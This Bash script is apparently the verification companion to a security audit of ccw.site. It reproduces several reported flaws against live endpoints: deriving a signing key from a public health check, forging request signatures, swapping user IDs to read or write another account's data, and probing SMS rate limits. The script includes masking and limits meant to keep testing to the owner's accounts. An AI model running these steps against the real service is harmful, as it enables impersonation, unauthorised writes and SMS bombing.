#!/usr/bin/env bash
# ============================================================================
# ccw_selfcheck.sh — CCW (ccw.site) 非破坏性安全自查脚本
# 配套报告: ccw-security-audit-report.md 第四节（所有者动态验证清单）
#
# 用法:
#   export TOKEN_A="测试账号A的token"     # 必填(T3-T5)
#   export UID_A="测试账号A的user-id"    # 必填(T3-T5)
#   export UID_B="测试账号B的user-id"    # T4 需要(越权验证的"受害者"必须是你的小号)
#   export PHONE_OWN="你自己的手机号"     # T8 需要
#   export RUN_STAGE=1                   # 默认0。=1 时启用 T6/T7/T8(会产生少量数据!)
#   bash ccw_selfcheck.sh > result.txt 2>&1
#
# 安全约定:
#   * 所有输出自动打码(邮箱/手机号/token)，可直接贴回给分析者
#   * T6/T7 只允许对自己的两个测试账号操作；发现任何真实用户数据请立即停止
#   * 单项请求次数已限制到最小，请勿自行调大
# ============================================================================

set -u
CW="https://community-web.ccw.site"
UA="Mozilla/5.0 (selfcheck)"
ORIG=("Origin: https://learn.ccw.site" "Referer: https://learn.ccw.site/")

say(){ printf '\n===== %s =====\n' "$*"; }
mask(){
  sed -E \
    -e 's/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/[EMAIL]/g' \
    -e 's/\b1[0-9]{10}\b/[PHONE]/g' \
    -e "s/${TOKEN_A:-__none__}/[TOKEN_A]/g"
}
req(){ # req METHOD PATH [JSON_BODY] [EXTRA_HEADERS...]
  local m="$1" p="$2" b="${3:-}" ; shift 3 || true
  if [ -n "$b" ]; then
    curl -sS -m 15 -X "$m" "$CW$p" -H "Content-Type: application/json" \
      -H "User-Agent: $UA" -H "Cookie: token=${TOKEN_A:-}; cookie-user-id=${UID_A:-}" \
      "$@" ${ORIG[@]+"${ORIG[@]}"} -d "$b" 2>&1
  else
    curl -sS -m 15 -X "$m" "$CW$p" -H "Content-Type: application/json" \
      -H "User-Agent: $UA" -H "Cookie: token=${TOKEN_A:-}; cookie-user-id=${UID_A:-}" \
      "$@" ${ORIG+"${ORIG}"} 2>&1
  fi
}
need(){ command -v "$1" >/dev/null || { echo "[!] 缺少依赖: $1"; EXIT=1; }; }

EXIT=0; need curl; need jq; need openssl
echo "== CCW 自查 $(date '+%F %T')  RUN_STAGE=${RUN_STAGE:-0} =="

# ----------------------------------------------------------------------------
say "T1 [VULN-01] 公开接口推导签名密钥"
HC=$(curl -sS -m 15 -X POST "$CW/health/check" -H "Content-Type: application/json" \
      -H "User-Agent: $UA" -d '{}' 2>&1 | mask)
echo "$HC" | head -c 600; echo
KEY=$(echo "$HC" | jq -r '
  def hv: "0123456789abcdef" | index(.);
  [ .body[]? | ((.traceId // "")) |
    if length > 1 then
      (((.[0:1]|hv)//(-1))+1) as $i | if $i >= 1 then .[$i:$i+1] else " " end
    else " " end ] | join("") | explode | reverse | implode' 2>/dev/null)
if [ -n "$KEY" ] && [ "$KEY" != "null" ]; then
  echo "[T1] 推导出的候选密钥(长度 ${#KEY}): ${KEY:0:2}****(已截断展示)"
else
  echo "[T1] 密钥推导失败(接口结构可能已变化): $KEY"; KEY=""
fi

# ----------------------------------------------------------------------------
say "T2 [基线] 未登录访问 /base/dateTime 与 /students/self/detail"
echo "dateTime: $(req GET /base/DateTime | head -c 200)" | mask
echo "self/detail(无凭据应401类错误): $(req POST /students/self/detail '{}' | head -c 200)" | mask

# ----------------------------------------------------------------------------
if [ -n "${TOKEN_A:-}" ] && [ -n "${UID_A:-}" ]; then
  say "T3 [基线] 账号A正常鉴权 -> /students/self/detail"
  R3=$(req POST /students/self/detail '{}'); echo "$R3" | head -c 500; echo
  echo "[T3] 判定: 若上面返回的是A自己的资料则鉴权链路正常" | mask

  say "T5 [VULN-01/02] 签名预言机: 空发帖请求 x3 (不会创建内容, 应全部被拒)"
  BODY='{}'; TS=$(date +%s%3N)
  SIG_OK=$(printf '%s' "ccw${BODY}${TS}" | openssl dgst -md5 -hmac "$KEY" 2>/dev/null | awk '{print $NF}')
  SIG_BAD=$(printf '%s' "ccw${BODY}${TS}" | openssl dgst -md5 -hmac "wrong_key_123" | awk '{print $NF}')
  echo "-- a) 无签名头:"
  req POST /post/create "$BODY" | head -c 300 | mask; echo
  echo "-- b) 错误密钥签名(A=$SIG_BAD B=$TS):"
  req POST /post/create "$BODY" -H "A: $SIG_BAD" -H "B: $TS" | head -c 300 | mask; echo
  echo "-- c) 推导密钥签名(A=$SIG_OK B=$TS):"
  req POST /post/create "$BODY" -H "A: $SIG_OK" -H "B: $TS" | head -c 300 | mask; echo
  echo "[T5] 判定: 若 c 的报错与 a/b 不同(如从'签名错误'变为'参数校验错误')，
       => 服务端认可推导密钥, VULN-01 实锤。
       *** 若 c 返回成功(创建了帖子), 请立刻删除该帖并停止脚本, 说明空体未拦截 ***"

  say "T4 [VULN-06] cookie-user-id 替换测试 (A的token + B的user-id)"
  if [ -n "${UID_B:-}" ]; then
    R4=$(curl -sS -m 15 -X POST "$CW/students/self/detail" -H "Content-Type: application/json" \
        -H "User-Agent: $UA" -H "Cookie: token=${TOKEN_A}; cookie-user-id=${UID_B}" \
        ${ORIG[@]+"${ORIG[@]}"} -d '{}' 2>&1)
    echo "$R4" | head -c 500; echo
    echo "[T4] 判定: 对比 T3 与 T4 的昵称/oid —— 若返回了B的资料 => 身份声明可被客户端控制, VULN-06 实锤;
         若仍是A或报错 => 该点暂安全"
  else
    echo "[T4] 跳过: 未设置 UID_B"
  fi
else
  say "T3/T4/T5 已跳过: 未设置 TOKEN_A / UID_A"
fi

# ----------------------------------------------------------------------------
if [ "${RUN_STAGE:-0}" = "1" ]; then
  cat <<'WARN'
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!! 以下为写入型验证, 会产生少量真实数据。仅当你确认自 !
!! 己有权测试该环境、且 T6/T7 双方均为自己的测试账号!  !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
WARN
  sleep 3

  say "T6 [VULN-04] 排行榜跨用户提交 (A 为 B 提交 score=1)"
  echo "[T6] 需要一个真实存在的 leaderboardOid, 请手工填入后取消本行注释执行:"
  echo "# LB_OID=xxxx; req POST https://gandi-main.ccw.site/api/v1/leaderboard/submit ..."
  echo "[T6] 默认不自动执行(避免污染排行榜), 请按注释手工做一次并记录响应"

  say "T7 [VULN-05] 云变量跨用户写 (A 向 B 写 _selfcheck_=1)"
  if [ -n "${UID_B:-}" ] && [ -n "${TOKEN_A:-}" ]; then
    CDB="https://community-web-cloud-database.ccw.site"
    R7=$(curl -sS -m 15 -X POST "$CDB/api/v1/cloud-variable/user/save" \
      -H "Content-Type: application/json" -H "User-Agent: $UA" \
      -H "Cookie: token=${TOKEN_A}; cookie-user-id=${UID_A}" \
      ${ORIG[@]+"${ORIG[@]}"} \
      -d "{\"userId\":\"${UID_B}\",\"key\":\"_selfcheck_\",\"value\":1}" 2>&1)
    echo "$R7" | head -c 400; echo
    echo "[T7] 判定: code=成功 => 水平越权实锤(B 的云变量被 A 改写); 记得用B账号删掉该变量"
  fi

  say "T8 [VULN-07] 短信限频探测 (仅你自己的手机号, 最多2次)"
  if [ -n "${PHONE_OWN:-}" ]; then
    for i in 1 2; do
      R8=$(curl -sS -m 15 -X POST "https://sso.ccw.site/api/v1/captcha/v2/create" \
        -H "Content-Type: application/json" -H "User-Agent: $UA" \
        -d "{\"phone\":\"${PHONE_OWN}\"}" 2>&1 | mask)
      echo "第${i}次: $R8"
      sleep 2
    done
    echo "[T8] 判定: 两次都直接返回 batch_id/send_result=成功 且无图形码要求 => 无前置验证码, 可被短信轰炸滥用"
  else
    echo "[T8] 跳过: 未设置 PHONE_OWN"
  fi
else
  say "RUN_STAGE=0: T6/T7/T8(写入型) 已跳过"
fi

say "结束。result.txt 请整体贴回分析(已自动打码)。退出码=$EXIT"
exit $EXIT
